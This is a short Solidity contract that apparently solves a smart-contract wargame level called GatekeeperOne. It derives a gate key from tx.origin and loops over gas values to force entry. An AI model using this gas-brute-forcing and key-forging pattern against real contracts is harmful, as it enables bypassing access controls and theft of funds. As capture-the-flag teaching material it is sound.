// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attacker {
    IGatekeeperOne public target;

    constructor(address _target){
        target = IGatekeeperOne(_target);
    }

    function _buildKey() internal view returns(bytes8){
        return bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    }

    function attack() external returns (bool) {
        bytes8 key = _buildKey();

        uint256 base = 8191 * 10;

        for(uint256 i = 0; i < 8191; i++){
            (bool ok, ) = address(target).call{gas: base + i}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if(ok){
                return true;
            }
        }

        revert("No gas value worked");
    }
}